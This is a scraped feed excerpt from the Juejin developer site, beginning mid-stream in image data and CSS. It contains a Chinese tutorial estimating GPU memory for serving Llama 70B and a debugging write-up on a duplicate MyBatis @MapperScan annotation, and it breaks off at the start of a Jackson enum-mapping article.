JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言:部署大模型的第一道门槛</h2>
<p>当我们准备部署一个大语言模型并提供服务时,最先遇到的问题往往是:<strong>我到底需要准备多少GPU显存?</strong></p>
<p>这不仅关系到硬件成本,更直接影响服务的并发能力和响应速度。今天,我们就以<strong>Llama 70B模型</strong>为例,手把手教你计算推理所需的GPU显存。</p>
<h2 data-id="heading-1">📋 案例参数设定</h2>
<p>让我们先明确计算的基础参数:</p>
<ul>
<li>
<p><strong>模型规模</strong>:Llama 70B(700亿参数)</p>
</li>
<li>
<p><strong>模型层数</strong>:80层</p>
</li>
<li>
<p><strong>上下文长度</strong>:最大支持32K tokens</p>
</li>
<li>
<p><strong>Hidden Dimension</strong>:8196</p>
</li>
<li>
<p><strong>参数精度</strong>:每个参数2个bytes(FP16)</p>
</li>
<li>
<p><strong>并发用户数</strong>:10个同时请求</p>
</li>
</ul>
<p>基于这些参数,我们开始逐步计算所需的GPU显存。</p>
<h2 data-id="heading-2">💾 第一部分:模型权重显存</h2>
<p>首先要计算的是<strong>模型本身占据的显存</strong>,因为我们需要把整个模型加载到GPU中。</p>
<p><strong>计算公式:</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">模型显存 = 参数量 × 每参数字节数
        = 70B × 2 bytes
        = 70 × 10^9 × 2 bytes
        = 140 GB
</code></pre>
<p>这个140GB是模型权重的基础占用,无论有多少用户请求,这部分都是固定的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1508643296c44d2eb3f0eb77c9b32cca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bGF54S2SnVSYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572241&amp;x-signature=b4afNJEwyOJdZGsBETAcC6fjXH4%3D" alt="GPU显存配置主图" loading="lazy"/></p>
<h2 data-id="heading-3">🚀 第二部分:KV Cache显存(重点!)</h2>
<p>这是显存占用的<strong>大头</strong>,也是最容易被忽视的部分。</p>
<h3 data-id="heading-4">什么是KV Cache?</h3>
<p>在大模型推理时,文本是<strong>逐个token生成</strong>的。为了加速这个过程,我们使用KV Cache机制来缓存中间计算结果。</p>
<p><strong>如果没有KV Cache</strong>,每生成一个新token,都需要重新计算之前所有token的注意力权重,这会导致大量重复计算,严重影响推理效率。</p>
<h3 data-id="heading-5">KV Cache显存计算</h3>
<p>KV Cache的计算分为两步:</p>
<p><strong>步骤1:计算单个token的KV Cache大小</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">单token显存 = 层数 × Hidden Dimension × 字节数 × 2(Key + Value)
           = 80 × 8196 × 2 bytes × 2
           = 2.5 MB
</code></pre>
<p><strong>步骤2:计算总KV Cache</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">总KV Cache = 单token显存 × 上下文长度 × 并发用户数
          = 2.5 MB × 32K × 10
          = 2.5 MB × 32,000 × 10
          = 800 GB
</code></pre>
<p>注意:<strong>每个用户都需要独立的KV Cache</strong>,因为每个请求的上下文都不同。这就是为什么并发数对显存需求影响巨大!</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/904e61257eae4417a96ab7e5bb25052e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bGF54S2SnVSYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572241&amp;x-signature=nuMb5ZPq1UXzhG9iZQc0UGtEJsU%3D" alt="KV Cache工作原理图" loading="lazy"/></p>
<h2 data-id="heading-6">🔧 第三部分:其他显存开销</h2>
<p>除了模型权重和KV Cache,还有一些额外的显存占用:</p>
<h3 data-id="heading-7">1. Activation(激活值)</h3>
<p>神经网络每一层计算时产生的激活函数输出,需要暂存在显存中。</p>
<h3 data-id="heading-8">2. Buffers(缓冲区)</h3>
<p>存放中间变量的临时空间,计算完成后可能会被释放。</p>
<h3 data-id="heading-9">3. Overheads(开销)</h3>
<p>主要是显存碎片化导致的空间浪费。GPU显存分配是以block为单位的,可能会出现一些block未被充分利用的情况。</p>
<p><strong>估算方法:</strong></p>
<p>这些杂项通常按模型权重和KV Cache总和的**10%**来估算:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">其他开销 = (140 GB + 800 GB) × 10%
        = 94 GB
</code></pre>
<h2 data-id="heading-10">📊 总显存需求计算</h2>
<p>现在我们可以得出最终结果:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">总显存需求 = 模型权重 + KV Cache + 其他开销
          = 140 GB + 800 GB + 94 GB
          = 1,034 GB ≈ 1TB
</code></pre>
<p>也就是说,<strong>要支持10个并发用户使用Llama 70B模型,我们大约需要1TB的GPU显存!</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fb62a48e4154b358b50ac7533bb7e05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bGF54S2SnVSYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572241&amp;x-signature=wruF0I3MTWCOlhsuGoJcVvFr4aU%3D" alt="显存占用分布图" loading="lazy"/></p>
<h2 data-id="heading-11">💡 实用优化建议</h2>
<h3 data-id="heading-12">场景1:单用户场景</h3>
<p>如果只有1个用户,KV Cache显存大幅降低:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">KV Cache = 2.5 MB × 32K × 1 = 80 GB
总显存 = 140 + 80 + 22 = 242 GB
</code></pre>
<p>所需显存减少到<strong>约250GB</strong>,只需3-4张A100(80GB)即可。</p>
<h3 data-id="heading-13">场景2:更短的上下文</h3>
<p>实际应用中,很多请求的上下文长度远小于32K。如果平均上下文为8K:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">KV Cache = 2.5 MB × 8K × 10 = 200 GB
总显存 = 140 + 200 + 34 = 374 GB
</code></pre>
<p>显存需求降低到<strong>约400GB</strong>,大幅节省成本。</p>
<h2 data-id="heading-14">🎯 总结与延伸</h2>
<p>通过本文的计算方法,你可以快速估算<strong>任何大模型</strong>在不同场景下的显存需求:</p>
<p><strong>关键计算要素:</strong></p>
<ol>
<li>
<p>✅ 模型参数量 × 参数精度</p>
</li>
<li>
<p>✅ KV Cache = 层数 × Hidden维度 × 上下文长度 × 并发数</p>
</li>
<li>
<p>✅ 其他开销约为总和的10%</p>
</li>
</ol>
<p><strong>重要提示:</strong></p>
<ul>
<li>
<p>本文计算基于<strong>标准KV Cache推理</strong>方式</p>
</li>
<li>
<p>实际还有许多<strong>显存优化技术</strong>(如PagedAttention、量化等)可以大幅降低显存需求</p>
</li>
<li>
<p>不同推理框架的实现也会影响实际显存占用</p>
</li>
</ul>
<p>想了解如何进一步优化显存使用?敬请关注后续文章,我们将深入讲解各种显存优化技术!</p>
<hr/>
<p><strong>你在部署大模型时遇到过显存不足的问题吗?欢迎在评论区分享你的经验!</strong> 👇</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[困扰我一整天的MyBatis"Invalid bound statement"问题，原来是因为这个不起眼的注解冲突！]]></title>    <link>https://juejin.cn/post/7575488180981563392</link>    <guid>https://juejin.cn/post/7575488180981563392</guid>    <pubDate>2025-11-24T06:16:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180981563392" data-draft-id="7575488180981530624" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="困扰我一整天的MyBatis&quot;Invalid bound statement&quot;问题，原来是因为这个不起眼的注解冲突！"/> <meta itemprop="keywords" content="MyBatis,面试"/> <meta itemprop="datePublished" content="2025-11-24T06:16:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小胖"/> <meta itemprop="url" content="https://juejin.cn/user/1992752269369870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            困扰我一整天的MyBatis"Invalid bound statement"问题，原来是因为这个不起眼的注解冲突！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1992752269369870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小胖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:16:57.000Z" title="Mon Nov 24 2025 06:16:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>看似简单的配置冲突，却让我排查了整整一整天</p>
</blockquote>
<h2 data-id="heading-0">问题起源</h2>
<p>最近在整理一个SpringBoot项目的架构时，遇到了一个典型的MyBatis问题：</p>
<pre><code class="hljs language-java" lang="java">Invalid bound <span class="hljs-title function_">statement</span> <span class="hljs-params">(not found)</span>: com.xx.system.server.dao.SysRoleMapper.pagelist
</code></pre>
<p>这个错误对于MyBatis使用者来说再熟悉不过了。无非就是五种常见原因：</p>
<h2 data-id="heading-1">五种常规排查方案</h2>
<p><strong>第一种：检查namespace是否一致</strong>
确认mapper.xml中的namespace和实际的mapper接口完全一致。</p>
<p><strong>第二种：检查方法名是否匹配</strong>
核对mapper接口中的方法名和mapper.xml中的id标签，都是<code>pagelist</code>，完全匹配。</p>
<p><strong>第三种：检查文件是否被正确构建</strong>
清理maven，重新编译，确认target目录下确实存在对应的mapper.xml文件。</p>
<p><strong>第四种：检查资源文件配置</strong>
确认mybatis-plus的mapper-locations配置正确：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath*:mapper/**/*.xml</span>
</code></pre>
<p><strong>第五种：检查Spring配置</strong>
仔细检查了所有相关配置，没有发现明显问题。</p>
<p><strong>然而，当我试完这几种解决方案后 依旧没有解决！</strong></p>
<h2 data-id="heading-2">意外的发现</h2>
<p>在近乎绝望的时候，我无意中查看了项目的启动类<code>BootstrapApplication</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BootstrapApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(BootstrapApplication.class, args);
    }
}
</code></pre>
<p>然后又查看了MybatisConfig配置类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisConfig</span> {
    <span class="hljs-comment">// MyBatis-Plus 相关配置</span>
}
</code></pre>
<p><strong>问题就出在这里！</strong> 相同的包路径被<code>@MapperScan</code>注解扫描了两次。</p>
<h2 data-id="heading-3">问题根源分析</h2>
<h3 data-id="heading-4">重复扫描的副作用</h3>
<ol>
<li><strong>Bean重复注册</strong>：同一个Mapper接口会被Spring尝试注册两次</li>
<li><strong>Bean名称冲突</strong>：默认情况下，Mapper接口的Bean名称是接口名的首字母小写</li>
<li><strong>Spring Boot 2.1+的严格机制</strong>：Spring Boot 2.1之后默认不允许覆盖Bean定义</li>
</ol>
<h3 data-id="heading-5">为什么会导致"Invalid bound statement"？</h3>
<p>在重复扫描的情况下，虽然应用可能正常启动（取决于Spring配置），但MyBatis在构建Mapper代理时可能会出现混乱，导致部分Mapper方法无法正确绑定到对应的SQL语句。</p>
<h2 data-id="heading-6">解决方案</h2>
<p><strong>保持配置的统一性</strong>，只在一个地方使用<code>@MapperScan</code>：</p>
<h3 data-id="heading-7">方案一：只在启动类中配置（推荐）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BootstrapApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(BootstrapApplication.class, args);
    }
}
</code></pre>
<h3 data-id="heading-8">方案二：只在配置类中配置</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisConfig</span> {
    <span class="hljs-comment">// MyBatis-Plus 相关配置</span>
}
</code></pre>
<p>移除另一处的<code>@MapperScan</code>注解即可。</p>
<h2 data-id="heading-9">经验总结</h2>
<ol>
<li><strong>配置统一原则</strong>：相关的配置应该集中管理，避免分散在多处</li>
<li><strong>关注启动类</strong>：检查问题时要特别注意启动类中的注解配置</li>
<li><strong>理解框架机制</strong>：了解Spring Boot版本差异带来的行为变化</li>
<li><strong>代码审查要点</strong>：在代码审查时，要特别注意重复的注解配置</li>
</ol>
<h2 data-id="heading-10">配置建议</h2>
<p>对于MyBatis扫描配置，我个人建议：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath*:mapper/**/*.xml</span>
  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.xx.system.server.dao.entity</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">cache-enabled:</span> <span class="hljs-literal">false</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
      <span class="hljs-attr">logic-delete-field:</span> <span class="hljs-string">deleted</span>
      <span class="hljs-attr">logic-delete-value:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">logic-not-delete-value:</span> <span class="hljs-number">0</span>
</code></pre>
<p>并在启动类中统一配置Mapper扫描：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@MapperScan({
    "com.xx.system.server.dao"
})</span>
</code></pre>
<p>希望我的这次排查经历能够帮助到遇到类似问题的开发者，避免在这个问题上浪费不必要的时间！</p>
<p><strong>技术之路，细节决定成败！</strong></p>
<hr/>
<p><strong>关注我，获取更多实用技术干货和实战经验！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前后端数据传输: 利用 Jackson 注解实现 Enum 与 int 的双向映射]]></title>    <link>https://juejin.cn/post/7575884229525438500</link>    <guid>https://juejin.cn/post/7575884229525438500</guid>    <pubDate>2025-11-24T06:25:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229525438500" data-draft-id="7575884229525340196" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前后端数据传输: 利用 Jackson 注解实现 Enum 与 int 的双向映射"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-24T06:25:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户030480591263"/> <meta itemprop="url" content="https://juejin.cn/user/3793762867478852"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前后端数据传输: 利用 Jackson 注解实现 Enum 与 int 的双向映射
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3793762867478852/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户030480591263
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:25:44.000Z" title="Mon Nov 24 2025 06:25:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 